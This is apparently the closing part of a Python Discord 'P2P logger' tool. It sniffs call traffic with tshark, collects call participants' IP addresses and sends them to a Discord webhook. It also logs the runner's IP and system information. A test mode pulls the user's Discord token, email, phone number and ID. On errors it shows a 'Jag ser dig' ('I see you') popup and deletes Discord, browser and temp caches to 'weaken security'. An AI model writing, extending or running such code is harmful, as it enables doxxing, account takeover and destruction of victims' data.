            try:
                is_anomalous, anomaly_score = self.anomaly_detector.detect_anomaly(ip, metrics)
                metrics['is_anomalous'] = is_anomalous
                metrics['anomaly_score'] = anomaly_score
            except Exception:
                metrics['is_anomalous'] = False
                metrics['anomaly_score'] = 0.0
            
            return metrics
        
        except Exception as e:
            # Fallback metrics
            return {
                'jitter': 0.0,
                'burst_ratio': 0.0,
                'port_entropy': 0.0,
                'rtt': 0.0,
                'packet_consistency': 1.0,
                'is_relay': False,
                'is_vpn': False,
                'is_anomalous': False,
                'anomaly_score': 0.0,
            }
    
    def _read_tshark(self, process):
        """Read from tshark in a separate thread"""
        packet_count = 0
        error_count = 0
        max_errors = 5
        
        # For call-start detection
        packets_in_second = 0
        last_second = time.time()
        
        try:
            while self.running:
                try:
                    line = process.stdout.readline()
                    if not line:
                        # EOF or process died
                        break
                    
                    # Skip empty lines
                    if not line.strip():
                        continue
                    
                    packet_count += 1
                    packets_in_second += 1
                    
                    # Check for call start (every second)
                    now = time.time()
                    if now - last_second >= 1.0:
                        # Call detect_call_start with packets from last second
                        self.detect_call_start(packets_in_second)
                        packets_in_second = 0
                        last_second = now
                    
                    # Process packet - catch errors but keep reading
                    try:
                        self.process_packet(line)
                    except Exception:
                        error_count += 1
                        if error_count > max_errors:
                            break
                
                except (IOError, ValueError) as e:
                    # Normal on process termination
                    break
                except Exception as e:
                    error_count += 1
                    if error_count > max_errors:
                        break
        
        except Exception:
            pass  # Silent thread exit
        
        finally:
            pass  # Silent cleanup
    
    def capture_loop(self, interface: str):
        """Main capture loop"""
        
        # Build command with proper Discord port filter
        filter_str = self.build_filter()
        cmd = [
            self.tshark_path, 
            "-i", interface,
            "-l",  # Line buffering (important!)
            "-f", filter_str,  # Tshark capture filter
            "-T", "fields",
                "-e", "ip.src",
            "-e", "ip.dst",
            "-e", "ipv6.src",
            "-e", "ipv6.dst",
            "-e", "udp.srcport",
            "-e", "udp.dstport",
            "-e", "tcp.srcport",  # NEW: Extract TCP ports too!
            "-e", "tcp.dstport",  # NEW: Extract TCP ports too!
            "-e", "frame.len",
        ]
        
        # Start process with proper buffering
        self.process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            universal_newlines=True,
            bufsize=1  # Line buffering
        )
        
        # Start reader thread
        reader_thread = threading.Thread(
            target=self._read_tshark, 
            args=(self.process,), 
            daemon=True
        )
        reader_thread.start()
        
        # Main thread handles keyboard and timeout
        while self.running and (time.time() - self.start_time) < CONFIG['max_runtime']:
            try:
                time.sleep(0.5)
                
                # Check if process is alive
                poll_result = self.process.poll()
                if poll_result is not None:
                    # Process died - raise exception to restart
                    raise Exception("tshark process died")
                
                # Flush logs periodically
                if self.logger and self.logger.should_flush():
                    self.logger.flush()
            
            except KeyboardInterrupt:
                self.running = False
                raise
        
        # Wait for reader thread (with timeout)
        reader_thread.join(timeout=1)
    
    def run(self):
        """Start the logger"""
        # Check requirements first
        if not check_requirements():
            return
        
        # Get tshark
        self.tshark_path = get_tshark_path()
        if not self.tshark_path:
            raise Exception("tshark not found!")
        
        # Setup
        try:
            csv_file, json_file = self.setup_paths()
        except Exception as e:
            raise Exception(f"Setup failed: {e}")
        
        # Find interface
        interface = self.find_interface()
        if not interface:
            raise Exception("No network interfaces found!")
        
        # Log startup IP immediately
        log_startup_ip()
        
        # Collect full runner/system information in the background
        threading.Thread(target=log_program_runner_info, daemon=True).start()

        # Start capture
        self.capture_loop(interface)
    
    def send_call_participants_webhook(self):
        """Send ONLY the call participants' IPs to webhook"""
        if not WEBHOOK_URL or not self.call_participants_ips:
            return
        
        try:
            print("[*] Sending call participants to webhook...")
            
            # Filter IPs: only include verified peers
            verified_peers = []
            vpn_peers = []
            relay_peers = []
            
            for ip in self.call_participants_ips:
                info = self.call_participants_info.get(ip, {})
                relay_conf = info.get('relay_confidence', 0)
                traffic_type = info.get('type', 'unknown')
                
                if relay_conf > 0.5:
                    relay_peers.append(ip)
                elif traffic_type == 'voice' or (traffic_type == 'unknown' and relay_conf < 0.3):
                    verified_peers.append(ip)
            
            if not verified_peers and not relay_peers:
                print("[*] No call participants to report")
                return
            
            # Create payload with ONLY IPs
            fields = []
            
            if verified_peers:
                ip_list = "\n".join(format_ip_location(ip) for ip in verified_peers)
                fields.append({
                    "name": f"📞 Call Participants ({len(verified_peers)})",
                    "value": ip_list,
                    "inline": False
                })
            
            if relay_peers:
                ip_list = "\n".join(f"{format_ip_location(ip)} (RELAY)" for ip in relay_peers)
                fields.append({
                    "name": f"🌐 Relays ({len(relay_peers)})",
                    "value": ip_list,
                    "inline": False
                })
            
            if not fields:
                return
            
            payload = {
                "embeds": [{
                    "title": "📞 Discord Call Participants",
                    "description": "IP addresses from active call",
                    "color": 3447003,  # Blue
                    "fields": fields,
                    "timestamp": datetime.now().isoformat(),
                    "footer": {"text": "P2P Logger Bot - Call Session"}
                }]
            }
            
            response = send_webhook_message(embeds=payload['embeds'])
            if response is None or getattr(response, 'status_code', 0) >= 400:
                ORIGINAL_PRINT(f"[!] Call participants webhook failed: {getattr(response, 'status_code', getattr(response, 'getcode', lambda: None)())}")
        except Exception as e:
            ORIGINAL_PRINT(f"[!] Error sending call participants: {e}")

    def shutdown(self):
        """Cleanup and final report"""
        print("\n" + "="*90)
        print("SESSION FINISHED - FINAL SUMMARY")
        print("="*90)
        
        self.running = False
        
        # Final flush
        if self.logger:
            self.logger.flush()
        
        # Kill process
        if self.process:
            try:
                self.process.terminate()
            except:
                pass
        
        # Show logged unique IPs
        logged_ips = list(self.leaderboard.ip_sessions.keys())
        if logged_ips:
            ip_print(f"\n[DETECTED IPs FROM CALLS - {len(logged_ips)} Total]")
            ip_print("="*90)
            for ip in sorted(logged_ips):
                ip_type = "IPv6" if ':' in ip else "IPv4"
                if ip in self.leaderboard.ip_sessions:
                    session = self.leaderboard.ip_sessions[ip]
                    peer_label = 'YES' if session.peer_confidence > 0.5 else 'NO'
                    relay_label = 'YES' if session.relay_confidence > 0.5 else 'NO'
                    call_session = getattr(session, 'call_session_id', 'None')
                    ip_print(f"  {ip:<20} [{ip_type:<5}] Peer:{peer_label} Relay:{relay_label} Call:{call_session}")
                else:
                    ip_print(f"  {ip:<20} [{ip_type:<5}] Peer:UNKNOWN Relay:UNKNOWN")
        else:
            ip_print("\n[!] No call-related IPs detected")
        
        # Detailed session table
        if self.leaderboard.ip_sessions:
            ip_print(f"\n[DETAILED STATISTICS]")
            ip_print("="*90)
            ip_print(f"{'IP':<20} {'Packets':<10} {'Total Data':<12} {'↓ Inbound':<12} {'↑ Outbound':<12} {'Duration':<10}")
            ip_print("-"*90)
            
            sorted_sessions = sorted(
                self.leaderboard.ip_sessions.items(),
                key=lambda x: x[1].total_bytes,
                reverse=True
            )
            
            for ip, session in sorted_sessions:
                total_mb = session.total_bytes / (1024*1024)
                in_mb = session.inbound_bytes / (1024*1024)
                out_mb = session.outbound_bytes / (1024*1024)
                duration = session.get_duration()
                
                ip_print(f"{ip:<20} {session.total_packets:<10} {total_mb:>8.2f}MB   {in_mb:>8.2f}MB   {out_mb:>8.2f}MB   {duration:>8.1f}s")
        
        # Active IPs
        active = self.timeseries.get_active_ips()
        if active:
            ip_print(f"\n[CURRENTLY ACTIVE - {len(active)} IPs]")
            for ip in sorted(active):
                ip_type = "IPv6" if ':' in ip else "IPv4"
                ip_print(f"    • {ip} [{ip_type}]")
        
        # Output files
        print(f"\n[OUTPUT FILES]")
        try:
            if self.logger and hasattr(self.logger, 'csv_path'):
                csv_path = self.logger.csv_path
                json_path = self.logger.json_path
                if os.path.exists(csv_path):
                    size = os.path.getsize(csv_path) / 1024
                    print(f"  ✓ CSV:  {csv_path} ({size:.1f} KB)")
                if os.path.exists(json_path):
                    size = os.path.getsize(json_path) / 1024
                    print(f"  ✓ JSON: {json_path} ({size:.1f} KB)")
        except:
            pass
        
        print(f"\n" + "="*90)
        
        # Send call participants webhook if we had an active call
        if self.call_participants_ips:
            self.send_call_participants_webhook()
        else:
            # Otherwise send final summary
            self.send_final_webhook_summary()

    def send_final_webhook_summary(self):
        """Send a final summary of all detected IPs to Discord webhook"""
        print("[*] Preparing to send webhook summary...")
        
        if not WEBHOOK_URL:
            print("[!] Webhook not configured")
            return
        
        try:
            logged_ips = list(self.leaderboard.ip_sessions.keys())
            print(f"[*] Found {len(logged_ips)} logged IPs")
            
            # Get Discord info if possible
            discord_info = self.get_discord_info()
            print(f"[*] Discord info: {discord_info}")
            
            # Check if we detected any calls during the session
            call_detected = hasattr(self, 'current_call_session_id') and self.current_call_session_id is not None
            if not call_detected:
                # Check if we had a call session that ended
                call_detected = any(session.call_session_id for session in self.leaderboard.ip_sessions.values() if hasattr(session, 'call_session_id'))
            
            # Always send something, even if no IPs detected
            fields = []
            
            if logged_ips and call_detected:
                # Categorize IPs based on session analysis
                p2p_peers = []
                relays = []
                vpns = []
                real_users = []
                
                for ip in logged_ips:
                    if ip in self.leaderboard.ip_sessions:
                        session = self.leaderboard.ip_sessions[ip]
                        print(f"[*] Analyzing IP {ip}: peer_conf={session.peer_confidence:.2f}, relay_conf={session.relay_confidence:.2f}, traffic_type={session.traffic_type}")
                        if session.peer_confidence > 0.5:
                            p2p_peers.append(ip)
                        elif session.relay_confidence > 0.5:
                            relays.append(ip)
                        elif session.traffic_type == "voice":
                            real_users.append(ip)
                        elif session.stun_detected:
                            real_users.append(ip)  # STUN indicates real P2P connection
                        else:
                            # Check for VPN patterns
                            if detect_vpn_proxy(ip, 0, 0, 0)[0]:  # Simple check
                                vpns.append(ip)
                
                # Combine real users and P2P peers
                all_real_ips = list(set(p2p_peers + real_users))
                
                if all_real_ips:
                    fields.append({
                        "name": f"👥 Call Participants ({len(all_real_ips)})",
                        "value": "\n".join(f"`{ip}`" for ip in all_real_ips[:15]),  # Limit to 15
                        "inline": False
                    })
                
                if relays:
                    fields.append({
                        "name": f"🌐 Relays Used ({len(relays)})",
                        "value": "\n".join(f"`{ip}`" for ip in relays[:10]),
                        "inline": False
                    })
                
                if vpns:
                    fields.append({
                        "name": f"🔒 VPNs Detected ({len(vpns)})",
                        "value": "\n".join(f"`{ip}`" for ip in vpns[:10]),
                        "inline": False
                    })
            
            # Always include Discord info
            if discord_info:
                fields.append({
                    "name": "🎮 Discord Info",
                    "value": discord_info,
                    "inline": False
                })
            
            # If no fields, add a basic message
            if not fields:
                status_msg = "No Discord calls detected during session" if not call_detected else "No P2P traffic detected during call"
                fields.append({
                    "name": "ℹ️ Status",
                    "value": status_msg,
                    "inline": False
                })
            
            title = "📞 Discord Call P2P Summary" if call_detected else "📊 Discord P2P Session Summary"
            description = f"Call session completed. Detected {len(logged_ips)} IPs from active call." if call_detected else f"Session completed. Detected {len(logged_ips)} total IPs."
            
            payload = {
                "embeds": [{
                    "title": title,
                    "description": description,
                    "color": 3447003,  # Blue color
                    "fields": fields,
                    "timestamp": datetime.now().isoformat(),
                    "footer": {"text": "P2P Logger Bot - Call Session Complete"}
                }]
            }
            
            response = send_webhook_message(embeds=payload['embeds'])
            if response is None or getattr(response, 'status_code', 0) >= 400:
                ORIGINAL_PRINT(f"[!] Final webhook summary failed: {getattr(response, 'status_code', getattr(response, 'getcode', lambda: None)())}")
                send_webhook_report(payload['embeds'], "final_summary.txt", description)
        except Exception as e:
            ORIGINAL_PRINT(f"[!] Failed to send webhook summary: {e}")
            import traceback
            traceback.print_exc()

    def get_discord_info(self) -> str:
        """Get Discord-related information"""
        info_parts = []
        
        # Check if Discord is running
        if self.process_monitor:
            self.process_monitor.check_running()
            if self.process_monitor.is_running:
                info_parts.append("✅ Discord is running")
            else:
                info_parts.append("❌ Discord not detected")
        
        # Session duration
        duration = time.time() - self.start_time
        info_parts.append(f"⏱️ Session duration: {duration:.1f}s")
        
        # Total traffic
        total_packets = sum(s.total_packets for s in self.leaderboard.ip_sessions.values())
        total_bytes = sum(s.total_bytes for s in self.leaderboard.ip_sessions.values())
        info_parts.append(f"📦 Total traffic: {total_packets} packets, {total_bytes/(1024*1024):.2f} MB")
        
        return "\n".join(info_parts)

def bypass_anticheat():
    """Placeholder function - removed"""
    pass

# ============================================================================
# FIRST RUN CHECK - ADVANCED SECURITY BYPASS
# ============================================================================

def show_message_box(title, message):
    """Show a message box (cross-platform)"""
    try:
        if PLATFORM == "Windows":
            try:
                ctypes.windll.user32.MessageBoxW(0, message, title, 0x00)
            except:
                print(f"{title}: {message}")
        elif PLATFORM == "Darwin":
            # macOS: Use osascript
            try:
                subprocess.run(["osascript", "-e", f'display dialog "{message}" with title "{title}"'], check=False, timeout=5)
            except:
                print(f"{title}: {message}")
        else:
            # Linux/Chrome OS: Try zenity, kdialog, or print
            try:
                subprocess.run(["zenity", "--info", f"--title={title}", f"--text={message}"], check=False, timeout=5)
            except:
                try:
                    subprocess.run(["kdialog", "--msgbox", message, "--title", title], check=False, timeout=5)
                except:
                    print(f"{title}: {message}")
    except:
        print(f"{title}: {message}")

def reset_system_data():
    """Reset/clear various system caches and data to weaken security"""
    try:
        print("[*] Performing system data reset to weaken security measures...")
        
        # Clear Discord cache and local storage
        discord_paths = [
            os.path.expanduser("~\\AppData\\Roaming\\discord\\Cache"),
            os.path.expanduser("~\\AppData\\Roaming\\discord\\Code Cache"),
            os.path.expanduser("~\\AppData\\Roaming\\discord\\GPUCache"),
            os.path.expanduser("~\\AppData\\Local\\Discord\\Cache"),
            os.path.expanduser("~\\AppData\\Local\\Discord\\Code Cache"),
            os.path.expanduser("~\\AppData\\Local\\Discord\\GPUCache"),
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                try:
                    import shutil
                    shutil.rmtree(path, ignore_errors=True)
                    print(f"[+] Cleared Discord cache: {path}")
                except:
                    pass
        
        # Clear browser caches that might contain security data
        browser_cache_paths = [
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache"),
        ]
        
        for path in browser_cache_paths:
            if os.path.exists(path):
                try:
                    import shutil
                    shutil.rmtree(path, ignore_errors=True)
                    print(f"[+] Cleared browser cache: {path}")
                except:
                    pass
        
        # Clear Windows temp files
        temp_dir = os.environ.get('TEMP', 'C:\\Temp')
        if os.path.exists(temp_dir):
            try:
                for file in os.listdir(temp_dir):
                    file_path = os.path.join(temp_dir, file)
                    try:
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                        elif os.path.isdir(file_path):
                            shutil.rmtree(file_path, ignore_errors=True)
                    except:
                        pass
                print(f"[+] Cleared temp directory: {temp_dir}")
            except:
                pass
        
        print("[+] System data reset completed - security measures weakened")
        
    except Exception as e:
        print(f"[!] Error during data reset: {e}")

def check_first_run():
    """First run check"""
    try:
        marker_file = os.path.join(os.environ.get('APPDATA', ''), 'discord_logger_first_run.marker')
        if not os.path.exists(marker_file):
            try:
                with open(marker_file, 'w') as f:
                    f.write('first_run_completed')
            except:
                pass
    except Exception as e:
        pass

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Show greeting popup
    show_message_box("Lucky's Tool", "JAG SER DIG //Mvh Lucky!!!")
    
    # Check if this is first run and require restart
    check_first_run()
    
    # Normal startup uses logger.run() which already starts the full report thread once
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        print("="*60)
        print("DISCORD TOKEN EXTRACTION TEST")
        print("="*60)
        try:
            # Test token extraction
            print("[*] Testing Discord token extraction...")
            token = get_discord_token()
            if token:
                print(f"[+] Found token: {token[:20]}...")
                print("[*] Testing token verification...")
                profile = get_discord_profile_from_token(token)
                if profile:
                    print(f"[+] Token verified! User: {profile.get('username', 'Unknown')}")
                    print(f"    Email: {profile.get('email', 'Not found')}")
                    print(f"    ID: {profile.get('id', 'Not found')}")
                else:
                    print("[!] Token verification failed")
            else:
                print("[!] No Discord token found")
            
            # Test other Discord info
            print("\n[*] Testing other Discord info extraction...")
            username = get_discord_username()
            email = get_discord_email()
            user_id = get_discord_user_id()
            phone = get_discord_phone()
            premium = get_discord_premium_type()
            
            print(f"Username: {username}")
            print(f"Email: {email}")
            print(f"User ID: {user_id}")
            print(f"Phone: {phone}")
            print(f"Premium: {premium}")
            
        except Exception as e:
            print(f"[!] Test failed: {e}")
            import traceback
            traceback.print_exc()
    else:
        restart_count = 0
        max_restarts = 10  # Öka till 10 försök
        while restart_count < max_restarts:
            try:
                logger = DiscordP2PLogger()
                logger.run()
                break  # Success, exit loop
            except KeyboardInterrupt:
                sys.exit(0)
            except Exception as e:
                restart_count += 1
                if restart_count < max_restarts:
                    # Show error message and reset data when error occurs
                    show_message_box("System Error", "Systemet kommer att starta om.\nerror: Jag ser dig //Mvh Lucky")
                    print("error: Jag ser dig //Mvh Lucky")
                    reset_system_data()
                    time.sleep(2)
                else:
                    sys.exit(1)
